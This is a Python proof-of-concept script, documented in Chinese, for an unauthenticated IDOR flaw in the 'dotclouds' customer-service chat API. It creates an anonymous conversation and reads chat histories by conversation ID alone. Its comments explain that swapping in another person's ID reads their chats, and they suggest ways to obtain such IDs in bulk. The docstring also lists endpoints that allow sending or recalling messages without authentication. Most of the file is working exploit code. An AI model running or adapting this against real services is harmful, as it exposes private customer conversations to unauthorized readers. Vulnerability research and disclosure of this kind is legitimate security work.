#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""点云客服 net.dotclouds 会话接口零鉴权读取 PoC（IDOR）。

访客端 /dotclouds/chat/conversation/ 下多个接口不校验身份归属，请求体无任何身份字段：
  POST /dotclouds/chat/conversation/queryChatHistory  {"convId":"<32hex>","companyId":"200005"}
    → 200 {"state":true,"code":"SUCCESS","data":[{"fromUser":"...","message":"...","context":"..."}, ...]}
  POST /dotclouds/chat/conversation/queryConvMessage
       {"companyId":"200005","fromUser":"<fp>","convId":"<32hex>","random":"<fp>",
        "messageIndex":0,"customerUid":"<客服uid>"}
    → 200 {"code":"SUCCESS","data":{"messageIndex":1,"message":[...]}}
同样是零鉴权的还有：sendConvMessage（可往会话发消息）、recallMessage、endChat、
clearCustomerLoad。后台鉴权头是 token-dotclouds，但这些接口完全不检查。

限制：convId 为 32 位随机 hex（uuid4），不可直接枚举；会话列表接口
basis/customervisitor/appListConvId 需要正确 customerUid。要批量读取第三方会话，
需先从其它途径（客服侧列表接口、导出、日志、分享链接）获得 convId 或 customerUid。
"""
import json, os, sys, uuid
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import rawreq

HOST = 'www.example.com'
IP = '203.0.113.3'
PORT = 51010
COMPANY = '200005'


def call(path, body):
    data = rawreq.send(IP, PORT, path, 'POST', {'Content-Type': 'application/json;charset=UTF-8'},
                       json.dumps(body).encode(), sni=HOST, host_hdr=HOST,
                       timeout=15.0, maxlen=200000)
    txt = data.decode('utf-8', 'ignore')
    i = txt.find('{')
    return json.loads(txt[i:txt.rfind('}') + 1]) if i >= 0 else None


if __name__ == '__main__':
    # 1) 自建会话取得合法 convId（匿名）
    fp = uuid.uuid4().hex
    j = call('/dotclouds/chat/conversation/createConv', {
        'companyId': COMPANY, 'configId': COMPANY, 'fingerprint': fp, 'source': 'pc',
        'referer': '直接访问', 'customerUid': '', 'systemInfo': 'Windows10',
        'browserInfo': 'Chrome', 'random': fp, 'preGuideQuestion': '',
        'username': '', 'position': ''})
    conv = j['data']['convId']
    cust = (j['data'].get('customer') or {}).get('uid')

    # 2) 仅凭 convId 读取完整会话（无 token / 无归属校验）
    print(json.dumps(call('/dotclouds/chat/conversation/queryChatHistory',
                          {'convId': conv, 'companyId': COMPANY}), ensure_ascii=False)[:2000])
    print(json.dumps(call('/dotclouds/chat/conversation/queryConvMessage',
                          {'companyId': COMPANY, 'fromUser': fp, 'convId': conv,
                           'random': fp, 'messageIndex': 0, 'customerUid': cust}),
                     ensure_ascii=False)[:2000])
    # 3) 拿到他人 convId 后，把上面 convId 替换掉即可读他人聊天记录
